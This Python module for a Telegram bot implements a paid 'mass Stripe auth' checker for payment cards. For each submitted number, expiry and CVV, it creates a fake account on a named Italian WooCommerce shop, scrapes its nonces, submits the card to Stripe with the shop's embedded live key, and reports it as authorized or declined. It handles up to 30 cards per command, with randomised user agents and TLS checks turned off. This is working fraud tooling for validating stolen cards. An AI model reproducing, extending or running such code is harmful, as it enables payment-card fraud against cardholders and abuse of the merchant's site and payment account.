
import re
import time
import random
import string
import aiohttp
import asyncio
from pyrogram import filters
from CARD3D import app
from config import OWNER_ID
from pyrogram.enums import ParseMode
from CARD3D.core.mongo import has_premium_access, get_user, update_user, LEVELS
from fake_useragent import UserAgent

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

async def check_card(card_info, message, session):

    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return f"Invalid card format for {card_info}. Use: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    headers = {"user-agent": UserAgent().random}
    results = []

    try:
        async with session.get('https://purpleprofessionalitalia.it/my-account/',) as response:
            response_text = await response.text()
        
        register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_text)
        if not register_nonce:
            return f"Failed to extract nonce for {cc}."

        register = register_nonce.group(1)
        email = ''.join(random.choices(string.ascii_lowercase, k=20)) + '@yahoo.com'

        data = {
            'email': email,
            'password': 'ASDzxc#123#',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/my-account/',
            'register': 'Registrati',
        }

        async with session.post('https://purpleprofessionalitalia.it/my-account/', data=data) as post_response:
            await post_response.text()

        async with session.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/') as add_payment_response:
            response_text = await add_payment_response.text()
        
        nonce_match = re.findall(r'"add_card_nonce":"(.*?)"', response_text)
        if not nonce_match:
            return f"Failed to extract card nonce for {cc}."
        
        nonce = nonce_match[0]

        data = {
            'type': 'card',
            'billing_details[name]': '+',
            'billing_details[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': 'pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'
        }

        async with session.post('https://api.stripe.com/v1/payment_methods', data=data) as stripe_response:
            stripe_resp = await stripe_response.json()
            stripe_id = stripe_resp.get('id')
            if not stripe_id:
                return f"Failed to create Stripe payment method for {card}."
            
            print(f"Stripe ID Extraction Done ✅ {stripe_id}")

        params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
        confirm_data = {'stripe_source_id': stripe_id, 'nonce': nonce}

        async with session.post('https://purpleprofessionalitalia.it/', params=params, headers=headers, data=confirm_data) as confirm_response:
            confirm_text = await confirm_response.text()
            print(f"Response Text: {confirm_text}")

    except Exception as e:
        return f"Error for {card}: {e}"

    error_message_match = re.search(r'\"message\":\"(.*?)\"', confirm_text)
    if error_message_match:
            error_message = error_message_match.group(1)

    if 'success' in confirm_text:
        status = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅"
        resp = "Approved"
    else:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        resp = error_message
        
    results.append(
        f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n"
        f"𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"
    )

    return "\n".join(results)


@app.on_message(filters.command("msa", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    has_access, access_msg, user_plan = await has_premium_access(
        user_id, chat_id, required_credits=0
    )
    if not has_access:
        await message.reply_text(access_msg, parse_mode=ParseMode.MARKDOWN)
        return

    user = await get_user(user_id)
    if not user:
        await message.reply_text(
            "❌ **You are not registered. Please register using  /register in private.**",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    user_plan = user.get("plan", "Free")
    user_credits = user.get("credits", 0)
    user_plan_symbol = LEVELS.get(user_plan, {}).get("symbol", "")

    if user_id == OWNER_ID:
        user_plan = "STRIPEHIT"
        user_plan_symbol = LEVELS["STRIPEHIT"]["symbol"]
        user_credits = -1

    card_info_text = None

    if message.reply_to_message:
        card_matches = re.findall(card_pattern, message.reply_to_message.text)
        if card_matches:

            card_info_text = "\n".join(["|".join(match) for match in card_matches])
    else:
        try:
            card_info_text = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            await message.reply(
                "Please provide multiple card details, each on a new line in the format: `card_number|mm|yy|cvv`"
            )
            return

    if not card_info_text:
        await message.reply("No valid card details found. Please provide valid card details.")
        return

    cards_info = card_info_text.split("\n")[:30]
    invalid_cards = [card for card in cards_info if not card_pattern.fullmatch(card.strip())]
    if invalid_cards:
        await message.reply(f"Invalid card formats: {', '.join(invalid_cards)}. Use format: `card_number|mm|yy|cvv`.")
        return
    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    processing_msg = await message.reply("Processing your request...")


    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_card(card_info.strip(), message, session) for card_info in cards_info]
        responses = await asyncio.gather(*tasks, return_exceptions=True)


        final_response = "\n".join([res for res in responses if isinstance(res, str)])
        
        elapsed_time = round(time.time() - start_time, 2)
        await processing_msg.edit_text(
            text=f"𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n\n{final_response}\n"
            f"𝗧𝗶𝗺𝗲: {elapsed_time} seconds\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={user_id})⤿ {user_plan} {user_plan_symbol} ⤾\n"
        )

        if user_id != OWNER_ID:
                new_credits = user_credits - 1
                await update_user(user_id, {"credits": new_credits})
